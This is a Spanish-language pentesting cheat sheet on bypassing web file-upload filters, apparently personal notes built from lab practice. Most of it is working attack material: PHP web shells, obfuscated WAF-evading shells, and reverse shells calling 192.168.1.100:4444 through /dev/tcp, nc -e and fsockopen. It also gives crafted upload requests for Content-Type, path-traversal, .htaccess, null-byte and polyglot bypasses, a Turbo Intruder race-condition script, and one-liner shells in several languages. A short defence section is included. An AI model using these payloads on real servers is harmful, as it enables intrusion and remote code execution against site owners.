---

---

---
**Tags:** #FileUpload #WebShell #RCE #Bypass #PHP-Exploitation #PentestingWeb #OffensiveSecurity #Archivos

---

## 📑 Índice General

- **Parte 1: Fundamentos y Payloads Base**
    
    - [[#1. ¿Qué es y Conceptos Fundamentales?]]
        
    - [[#2. Métodos de Detección de Validaciones]]
        
    - [[#3. Colección de Payloads y Web Shells]]
        
- **Parte 2: Técnicas de Evasión (Filtros Básicos e Intermedios)**
	
    - [[#4. Evasión de Filtros Estructurales (MIME & Path)]]
	    
	- [[#5. Bypass de Blacklists y Configuración del Servidor (.htaccess)]]
	    
	- [[#6. Ofuscación de Extensiones y Truncamiento]]
	    
- **Parte 3: Técnicas Avanzadas, Tablas y Defensa**
    
    - [[#7. Ejecución Remota con Web Shell Multi-formato (Polyglot)]]
	    
	- [[#8. Bypass de Nombres con Hashes (MD5/SHA1)]]
	    
	- [[#9. Explotación mediante Race Condition (TOCTOU)]]
	    
	- [[#10. Tablas Maestras de Referencia y Evasión]]
	    
	- [[#11. Buenas Prácticas de Defensa]]
    
- **Parte 4: Tablas resumen de acceso rapido**
	
	- [[#12. Tabla Resumen de Técnicas de Evasión]]
	- [[#13. Diccionario de Magic Bytes (Firmas de Archivos)]]
	- [[#14. Equivalentes de .htaccess en otros Entornos]]
	- [[#15. Dobles Extensiones y Evasiones Específicas]]
		- [[#A. Doble Extensión (Evasión de Apache)]]
		- [[#B. Extensiones Alternativas (Bypass de Listas Negras)]]
	- [[#16. Tabla de Payloads "One-Liner" por Lenguaje]]

---

## 1. ¿Qué es y Conceptos Fundamentales?

> El **File Upload Bypass** es una técnica de seguridad ofensiva utilizada para evadir las restricciones impuestas por una aplicación web durante la subida de archivos. El objetivo principal es lograr subir un archivo ejecutable malicioso (como una Web Shell o script) a un directorio web accesible, para que el servidor lo interprete y ejecute.

Las vulnerabilidades de **Subida de Archivos Sin Restricciones** ocurren cuando el servidor no valida adecuadamente aspectos cruciales como el nombre, la extensión, el Content-Type, el tamaño o el contenido real del archivo.

**¿Por qué es necesario aplicar técnicas de Bypass?**

- El servidor valida solo superficialmente por extensión o cabecera HTTP (`Content-Type`).
    
- Existen restricciones estrictas de tamaño, o el servidor renombra el archivo al subirlo.
    
- Las carpetas de destino tienen los permisos de ejecución desactivados.
    
- Hay validaciones insuficientes en el contenido real del archivo (Magic Bytes).
    

Si logramos saltar estos controles, el impacto es crítico: **RCE (Remote Code Execution)** en el contexto del usuario del servidor web (usualmente `www-data`).

---

## 2. Métodos de Detección de Validaciones

Antes de lanzar un exploit, es fundamental enumerar cómo el servidor está validando nuestra subida. Aquí tienes una tabla para estructurar tus pruebas:

|**Qué Valida el Servidor**|**Cómo Detectarlo en la Auditoría**|
|---|---|
|**Extensión**|Subir `test.php`. Si lo rechaza, probar dobles extensiones como `test.php.jpg` o mayúsculas `test.PHP`.|
|**Content-Type**|Interceptar la subida con Burp Suite y cambiar `application/x-php` a `image/png`.|
|**Magic Number / Firma**|Modificar los primeros bytes del archivo (añadir `GIF89a;`) para ver si el rechazo desaparece.|
|**Tamaño Máximo**|Subir un archivo artificialmente grande o muy pesado y observar los errores del servidor.|
|**Hash del Nombre**|Observar la respuesta HTTP o el código fuente para ver si el archivo original fue renombrado (ej. a MD5).|
|**Permisos de Carpeta**|Si el archivo se sube pero se lee como texto plano, la carpeta no permite ejecución. Requiere Path Traversal.|

---

## 3. Colección de Payloads y Web Shells

Dependiendo de las restricciones de tamaño y los filtros (WAF/Antivirus), necesitaremos adaptar nuestro código malicioso. Aquí tienes un arsenal clasificado:

### 📌 Payloads Básicos (Ejecución Directa)

Ideales cuando no hay filtros de contenido y buscamos una prueba de concepto rápida.

```PHP
<?php system("whoami"); ?>
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php exec($_POST['cmd']); ?>
```

- **One-Liner Ultracorto:** Forma corta de `<?php echo`, ideal para saltar restricciones de tamaño de archivo:
    
    ```PHP
    <?=`$_GET[0]`?>
    ```
    
    _(Uso: `shell.php?0=whoami`)_
    

### 📌 Bypass con Variables Dinámicas y Ofuscación

Útiles cuando un **WAF (Web Application Firewall)** o un antivirus busca firmas exactas de funciones peligrosas como `system`.

- **Concatenación de strings:**
    
    ```PHP
    <?php $a='sys';$b='tem';$c=$a.$b;$c($_GET['cmd']); ?>
    ```
    
- **Ofuscación avanzada (evasión de firmas):**
    
    ```PHP
    <?php $_="`";$_=${'_'.'_'};echo $_($_POST['cmd']); ?>
    ```
    

### 📌 Reverse Shells Integradas

Para obtener una sesión interactiva en nuestra máquina atacante (`nc -lvnp 4444`).

- **Conexión Bash:**
    
    ```PHP
    <?php system("bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'"); ?>
    ```
    
- **Usando Netcat (nc):**
    
    ```PHP
    <?php system("nc -e /bin/bash 192.168.1.100 4444"); ?>
    ```
    
- **Reverse Shell con URL-encoding (Para Single-GET):** Evita problemas con espacios en validaciones estrictas.
    
    ```PHP
    <?php system("bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261'"); ?>
    ```
    
- **PHP Puro (Sin depender de binarios del sistema):**
    
    ```PHP
    <?php $ip='192.168.1.100'; $port=4444; $sock=fsockopen($ip, $port); exec("/bin/sh -i <&3 >&3 2>&3"); ?>
    ```
    

### 📌 Web Shells Interactivas

- **Interfaz HTML Completa (Navegación cómoda):**
    
    ```PHP
    <html>
    <body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="TEXT" name="cmd" id="cmd" size="80" placeholder="Introduce un comando...">
    <input type="SUBMIT" value="Execute">
    </form>
    <pre>
    <?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
    </pre>
    <script>document.getElementById("cmd").focus();</script>
    </body>
    </html>
    ```
    
- **Mini Web Shell (Formato compacto):**
    
    ```PHP
    <?php if(isset($_REQUEST['cmd'])){echo "<pre>";system($_REQUEST['cmd']);echo "</pre>";} ?>
    ```
    

> [!WARNING]
> 
> **Sobre WSO Shells y similares:** Las shells complejas como _Web Shell by Orb (WSO)_ son extremadamente útiles por su interfaz gráfica completa, pero son detectadas inmediatamente por casi cualquier solución de seguridad moderna. Úsalas solo en entornos controlados de laboratorio o CTFs sin defensa activa.


---

## 4. Evasión de Filtros Estructurales (MIME & Path)

### 🔍 Web Shell por Bypass de Content-Type

Muchos backends cometen el error de confiar ciegamente en la cabecera `Content-Type` enviada por el navegador cliente. Al ser un parámetro manipulable, la evasión es trivial.

- **Cómo descubrirlo:** Si al subir un `.php` recibes un error tipo _"Solo se admiten imágenes"_, intercepta la petición.
    
- **Técnica:** Modificar el tipo MIME en la petición HTTP con Burp Suite.
    

**💻 PoC (Basado en tu laboratorio):**

```HTTP
POST /upload.php HTTP/1.1
Content-Disposition: form-data; name="avatar"; filename="webshell.php"
/* Cambio de esto: Content-Type: application/x-php */
/* A esto: */
Content-Type: image/png

<?php system($_GET['cmd']); ?>
```

---

### 🔍 Web Shell por Path Traversal (Salto de Directorio)

Esta técnica se utiliza cuando el servidor guarda el archivo con éxito pero **no lo ejecuta** en la carpeta de destino (`/uploads/`), porque dicha carpeta tiene el motor de ejecución (ej. PHP) desactivado por seguridad.

- **Cómo descubrirlo:** El archivo se sube, pero al navegar hacia él, el navegador te muestra el código fuente en texto plano en lugar de ejecutarlo.
    
- **Técnica:** Forzar la subida a un directorio superior (ej. la raíz web `/var/www/html/`) inyectando saltos de directorio.
    
- **Evasión de filtros:** Si el backend sanitiza el nombre eliminando la barra `/`, utilizamos **URL Encoding** (`%2f`).
    

**💻 PoC (Tu ejemplo de inyección de ruta):**

```HTTP
Content-Disposition: form-data; name="avatar"; filename="..%2fwebshell.php"
Content-Type: application/x-php

<?php echo shell_exec($_GET['cmd']); ?>
```

> [!IMPORTANT]
> 
> **El mecanismo interno:** Al usar `..%2fwebshell.php`, el servidor concatena la ruta interna: `/var/www/app/avatars/` + `../webshell.php`, resultando en `/var/www/app/webshell.php`, evadiendo las restricciones de la carpeta original.

---

## 5. Bypass de Blacklists y Configuración del Servidor (.htaccess)

### 🔍 Ataque vía .htaccess (Específico de Apache)

En lugar de permitir solo imágenes (lista blanca), el servidor bloquea extensiones peligrosas conocidas (`.php`, `.phtml`, `.exe`). Sin embargo, si permite subir archivos de configuración distribuida, podemos redefinir las reglas del servidor en tiempo de ejecución.

- **Cómo descubrirlo:** Intentas subir varias extensiones de PHP y todas son bloqueadas, pero subir un archivo de texto plano o sin extensión funciona.
    
- **Técnica:** Subir un `.htaccess` que asigne el "handler" de PHP a una extensión inventada o inofensiva.
    

**💻 PoC (Tu laboratorio en dos pasos):**

1. **Subida del configurador (Modificando reglas):**
    
    ```HTTP
    Content-Disposition: form-data; name="avatar"; filename=".htaccess"
    Content-Type: text/plain
    
    AddType application/x-httpd-php .luis
    ```
    
1. **Subida de la Web Shell camuflada:**
    
    ```HTTP
    Content-Disposition: form-data; name="avatar"; filename="webshell.luis"
    Content-Type: application/x-php
    
    <?php system($_GET['cmd']); ?>
    ```
    

- **Resultado:** El filtro no bloquea `.luis` porque no está en su lista negra, pero Apache lo ejecuta como PHP.
    

---

## 6. Ofuscación de Extensiones y Truncamiento

Cuando el servidor usa listas blancas estrictas (ej. "el archivo DEBE terminar en `.jpg`"), intentamos "engañar" al sistema operativo o al lenguaje de validación para que ignore la extensión final o procese ambas.

### 🧪 Null Byte Injection (`%00`)

Basado en cómo los lenguajes derivados de C (y sistemas operativos más antiguos) leen las cadenas de texto. Un _Null Byte_ indica el final de la cadena de caracteres (String Termination).

- **Técnica:** Inyectar `%00` o `\x00` justo antes de la extensión permitida. La validación web (en alto nivel) ve `.jpg` y lo aprueba, pero el OS corta el nombre en el null byte al guardarlo en disco.
    

**💻 PoC (Tu ejemplo de truncamiento):**

```HTTP
Content-Disposition: form-data; name="avatar"; filename="webshell.php%00.jpg"
```

### 🧪 Variaciones de Extensiones y Truncamiento de SO

A veces el servidor está mal configurado (ej. Apache con `AddHandler` en lugar de `SetHandler`) o el sistema operativo maneja los nombres de forma peculiar.

|**Método de Evasión**|**Ejemplo de Nombre**|**Por qué funciona (El "Truco")**|
|---|---|---|
|**Doble extensión**|`shell.php.jpg`|Apache lee de derecha a izquierda; si no tiene una regla estricta para `.jpg`, retrocede y lo ejecuta como `.php`.|
|**Mayúsculas**|`shell.PHP`|Windows (y a veces el filtro WAF) no diferencia mayúsculas/minúsculas, por lo que evade un filtro programado solo como `== ".php"`.|
|**Punto final / Espacio**|`shell.php.` o `shell.php`|En Windows, los puntos o espacios al final de un nombre de archivo se eliminan automáticamente al guardarlo, resultando en `.php`.|
|**Variantes Antiguas**|`shell.phtml`, `.php5`|Si la lista negra no está actualizada, el intérprete del servidor a menudo sigue soportando estas extensiones por retrocompatibilidad.|

---

### 💡 Tip de Profesional: Bypass por Tamaño Máximo (Minificación)

Si tus scripts son bloqueados porque el servidor solo admite archivos minúsculos (ej. límite de 100 bytes):

- **Payload original (34 bytes):** `<?php echo system($_GET['cmd']); ?>`
    
- **Tu Payload minificado (12 bytes):** `<?=`$_GET[0]`?>` _(Pasas el comando en el parámetro `0` de la URL)._

---

## 7. Ejecución Remota con Web Shell Multi-formato (Polyglot)

Cuando el servidor implementa **Content Sniffing** (inspecciona el contenido real del archivo leyendo sus _Magic Numbers_ o firmas hexadecimales), cambiar la extensión o el `Content-Type` no es suficiente. El servidor sabe que tu archivo `.php` es texto y no una imagen.

La solución es crear un **Polyglot**: un archivo que es válido para dos formatos simultáneamente (ej. es una imagen válida Y un script PHP válido a la vez).

### 🔍 ¿Cómo descubrirlo y explotarlo?

1. El servidor rechaza el archivo indicando que "no es una imagen válida" o "el contenido está corrupto", a pesar de tener la extensión correcta.
    
2. Falsificamos la cabecera del archivo introduciendo los Magic Bytes de un formato permitido (como GIF).
    
3. Alternativamente, ocultamos el payload de PHP dentro de los metadatos EXIF de una imagen legítima.
    

### 💻 PoC 1: Falsificación de Magic Bytes (GIF)

Engañamos a la validación añadiendo la firma `GIF89a;` (o `GIF8;`) al principio del script. El intérprete de PHP ignorará esto porque está fuera de las etiquetas `<?php ?>`, pero el validador del servidor creerá que es un GIF.

```PHP
GIF89a;
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd'])) { system($_GET['cmd']); }
?>
</pre>
</body>
</html>
```

### 💻 PoC 2: Payload en Metadatos (ExifTool)

Inyectamos el código malicioso en el campo `Comment` de una imagen real.

```Bash
# Inyectar el payload en la imagen
exiftool -Comment='<?php system($_GET["cmd"]); ?>' test.jpg -o polyglot.php

# O si el servidor requiere doble extensión:
exiftool -Comment='<?php system($_GET["cmd"]); ?>' imagen.jpg
mv imagen.jpg imagen.php.jpg
```

- **Nota:** Si la aplicación extrae metadatos y los pinta en pantalla sin sanitizar, o si logras un LFI que apunte a esta imagen, obtendrás ejecución de código.
    

---

## 8. Bypass de Nombres con Hashes (MD5/SHA1)

Algunos sistemas intentan mitigar ataques renombrando el archivo subido a un hash (ej. `3a7bd3e2360a3d4854279df00c91f314.php`) para que el atacante no sepa la URL de su Web Shell.

### 🔍 ¿Cómo descubrir la ruta?

1. **Fuga de información:** Sube un archivo legítimo (`test.png`) y revisa la respuesta HTTP, redirecciones o el código fuente HTML del perfil para ver cómo se guardó.
    
2. **Cálculo predecible:** Si el nombre nuevo parece un hash, calcúlalo localmente: `md5sum test.png` o calcula el MD5 de tu nombre de usuario + timestamp. Si coincide con el que ves en la web, ya tienes el algoritmo.
    
3. Repite el proceso con tu archivo malicioso para predecir su nombre final y acceder a él.
    

---

## 9. Explotación mediante Race Condition (TOCTOU)

Una vulnerabilidad **Time-of-Check to Time-of-Use (TOCTOU)** ocurre cuando el servidor acepta el archivo, lo guarda en disco temporalmente, lo analiza y, al darse cuenta de que es un `.php`, lo borra.

### 🔍 ¿Cómo descubrirlo y explotarlo?

1. Observas que el archivo se sube sin error de conexión, pero cuando vas a la URL, te da un `404 Not Found`. El antivirus o el script de limpieza lo está borrando en milisegundos.
    
2. Si logramos enviar una petición GET para ejecutar el archivo _exactamente en la fracción de segundo_ que existe en el disco, ganaremos la condición de carrera.
    
3. Usamos un **Single-Packet Attack en HTTP/2** para enviar la petición de subida y decenas de peticiones de lectura simultáneamente.
    

### 💻 PoC: Single-Packet Attack / (Turbo Intruder en Burp Suite)

Aquí el servidor comprueba si el archivo es malicioso o esta permitido una vez subido, si no esta permitido, el servidor lo borra pero hay un espacio de tiempo muy corto en el que ese archivo esta en el servidor, por lo que si mandamos dos peticiones a la vez es posible abrir ese archivo, se puede hacer mediante Single-Packet Attack en el repeater creando un grupo con las solicitudes o en la extension de TurboIntuder con el siguiente script en Python:

```Python
def queueRequests(target, wordlists):
    # Para el Single-Packet Attack en HTTP/2: concurrentConnections debe ser 1 
    # y el engine BURP2 es obligatorio para agrupar todo en un solo flujo TCP
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    upload_req = target.req # Petición POST interceptada (subida)
    
    # Petición GET hacia la shell apuntando a un comando
    read_req = """GET /files/avatars/webshell.php?cmd=cat%20/home/carlos/secret HTTP/2
Host: 0ac200da0381f447817561600067007d.web-security-academy.net
Cookie: session=1ZdKJgZJ7agBQ7EEbklHWjI04OUHuLYp

"""

    # Encolamos 1 subida en la 'puerta'
    engine.queue(upload_req, gate='race')
    
    # Encolamos 30 lecturas en la misma 'puerta' para ametrallar el archivo
    for i in range(30):
        engine.queue(read_req, gate='race')

    # Al abrir la puerta, Burp envía los "últimos bytes" de todas las peticiones 
    # en un solo paquete TCP. ¡Velocidad máxima!
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```

---

## 10. Tablas Maestras de Referencia y Evasión
### 🛠️ Diccionario de Magic Numbers

Úsalo para falsificar cabeceras directamente en texto o editores hexadecimales.

|**Formato**|**Magic Number (Hex)**|**Representación ASCII**|**Ejemplo de Inyección Rápida**|
|---|---|---|---|
|**PNG**|`89 50 4E 47 0D 0A 1A 0A`|`\x89PNG\r\n\x1a\n`|-|
|**GIF**|`47 49 46 38 39 61`|`GIF89a` o `GIF87a`|`GIF89a; <?php system('id'); ?>`|
|**JPG**|`FF D8 FF`|`ÿØÿ`|-|
|**PDF**|`25 50 44 46 2D`|`%PDF-`|`%PDF-1.4 <?php system('id'); ?>`|
|**ZIP**|`50 4B 03 04`|`PK..`|-|

### 🛠️ Tabla de Extensiones Alternativas por Lenguaje

Si el servidor aplica listas negras estrictas sobre extensiones principales.

|**Lenguaje / Entorno**|**Extensiones Clásicas Bloqueadas**|**Extensiones Alternativas para Bypass**|**Archivo de Configuración**|
|---|---|---|---|
|**PHP**|`.php`|`.php3`, `.php4`, `.php5`, `.php7`, `.phtml`, `.phar`, `.phps`, `.pht`|`.htaccess`|
|**ASP / .NET**|`.asp`, `.aspx`|`.config`, `.ashx`, `.asmx`, `.aspq`, `.axd`|`web.config`|
|**JSP (Java)**|`.jsp`|`.jspx`, `.jsw`, `.jsv`, `.jspf`|-|

---

## 11. Buenas Prácticas de Defensa

Para mitigar todas las técnicas documentadas en esta guía, el servidor debe implementar un enfoque de defensa en profundidad:

- **Validación Robusta:** Validar la extensión contra una **lista blanca** estricta Y validar el contenido real del archivo (reprocesando imágenes con librerías como GD o ImageMagick para destruir payloads embebidos).
    
- **Almacenamiento Seguro:** Almacenar los archivos subidos **fuera del directorio web (webroot)**. Si deben ser accesibles, servirlos mediante un script que no permita la ejecución directa.
    
- **Desactivar Ejecución:** Configurar los directorios de subida sin permisos de ejecución (`php_admin_value engine Off` en Apache, o restringir en Nginx/IIS).
    
- **Renombrado Seguro:** Renombrar todos los archivos subidos utilizando identificadores únicos universales (UUIDs), descartando el nombre y la extensión proporcionados por el usuario.
    
- **Mitigar TOCTOU:** Realizar el análisis de virus/malware en un entorno aislado (sandbox o memoria) _antes_ de mover el archivo a su destino final.


---

## 12. Tabla Resumen de Técnicas de Evasión

|**Técnica de Evasión**|**Lo que el Servidor Filtra**|**Cómo lo Evadimos**|**Herramienta / Concepto Clave**|
|---|---|---|---|
|**Bypass Content-Type**|Cabecera HTTP MIME Type|Cambiar `application/x-php` a `image/jpeg` en Burp.|Proxies (Burp Suite)|
|**Path Traversal**|Ejecución en carpeta destino|Inyectar `..%2f` en el campo `filename`.|URL Encoding|
|**Bypass Blacklist**|Extensiones `.php` prohibidas|Subir `.htaccess` para ejecutar extensiones customizadas.|Directiva `AddType`|
|**Null Byte Injection**|Extensión final (ej. solo `.jpg`)|Añadir `%00.jpg` al final de `archivo.php`.|C-string termination (`\x00`)|
|**Polyglot / Magic Bytes**|Contenido real del archivo|Añadir `GIF89a;` o usar ExifTool en los metadatos.|Firmas Hexadecimales / ExifTool|
|**Race Condition**|Análisis post-subida (Borrado)|Enviar peticiones GET y POST simultáneas en HTTP/2.|Turbo Intruder (Single-Packet Attack)|

---
## 13. Diccionario de Magic Bytes (Firmas de Archivos)

Cuando el servidor valida el contenido real del archivo (Content Sniffing), debemos modificar los primeros bytes de nuestro script PHP/ASP/JSP para que coincidan con un formato permitido.

|**Formato**|**Firma Hexadecimal (Magic Bytes)**|**Representación ASCII**|
|---|---|---|
|**JPEG/JPG**|`FF D8 FF E0` o `FF D8 FF E1`|`ÿØÿà`|
|**PNG**|`89 50 4E 47 0D 0A 1A 0A`|`.PNG....`|
|**GIF89a**|`47 49 46 38 39 61`|`GIF89a`|
|**PDF**|`25 50 44 46 2D`|`%PDF-`|
|**ZIP**|`50 4B 03 04`|`PK..`|

> [!TIP]
> 
> **Uso en PoC:** Para bypassear una validación de firma, puedes simplemente escribir `GIF89a;` al principio de tu archivo `.php`. El intérprete de PHP ignorará esa primera línea por no estar entre etiquetas `<?php ?>`, pero el servidor creerá que es un GIF real.

---

## 14. Equivalentes de .htaccess en otros Entornos

No todo es Apache. Dependiendo de la tecnología del servidor, el archivo de configuración "atacable" cambia. Si logras subir uno de estos, puedes reconfigurar cómo el servidor maneja las extensiones.

|**Servidor / Tech**|**Archivo Clave**|**Técnica de Explotación**|
|---|---|---|
|**Apache**|`.htaccess`|`AddType application/x-httpd-php .txt` (Ejecuta .txt como PHP).|
|**IIS (ASP.NET)**|`web.config`|Modificar `handlers` para permitir ejecución de scripts en carpetas de contenido.|
|**Nginx**|`nginx.conf`|(Raro poder subirlo, pero si se logra, se cambian las directivas `location ~ \.php$`).|
|**ASP.NET Core**|`appsettings.json`|Cambiar configuraciones de rutas o permisos si la app lo lee dinámicamente.|

---

## 15. Dobles Extensiones y Evasiones Específicas

A veces las listas negras son parciales o están mal configuradas. Aquí tienes combinaciones que suelen funcionar cuando `.php` está bloqueado.

### A. Doble Extensión (Evasión de Apache)

En algunas configuraciones de Apache mal hechas (`AddHandler`), el servidor ejecuta el archivo si **cualquiera** de las extensiones es válida.

- **Ejemplo:** `shell.php.jpg` o `shell.php.png`
    
- **Lógica:** El servidor ve `.jpg` al final y lo acepta, pero Apache ve que contiene `.php` y lo procesa.
    

### B. Extensiones Alternativas (Bypass de Listas Negras)

Si `.php` está en la lista negra, prueba sus variantes:

- **PHP:** `.php3`, `.php4`, `.php5`, `.php7`, `.phtml`, `.phar`, `.phps`.
    
- **ASP:** `.aspx`, `.config`, `.ashx`, `.asmx`, `.aspq`, `.axd`.
    
- **JSP:** `.jspx`, `.jsw`, `.jsv`, `.jspf`.
    

---

## 16. Tabla de Payloads "One-Liner" por Lenguaje

Para tus Polyglots o subidas rápidas, usa estos comandos mínimos para confirmar RCE:

|**Lenguaje**|**Payload Mínimo (PoC)**|
|---|---|
|**PHP**|`<?php system($_GET['c']); ?>`|
|**ASP**|`<% eval request("c") %>`|
|**ASP.NET**|`<%@ Page Language="J#" %><% Response.Write(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("..."))); %>`|
|**JSP (Java)**|`<% Runtime.getRuntime().exec(request.getParameter("c")); %>`|
|**Node.js**|`require('child_process').execSync(req.query.c).toString()`|

---

### 💡 "Filename Obfuscation" Extra

Si el servidor limpia puntos y barras, prueba con:

1. **Case Sensitivity:** `shell.PhP` (Windows suele ser _case-insensitive_ y lo ejecutará, pero el filtro _case-sensitive_ podría no verlo).
    
2. **Trailing dots/spaces:** `shell.php.` o `shell.php` (En Windows, los espacios y puntos al final se eliminan al guardar el archivo, convirtiéndolo en `shell.php`).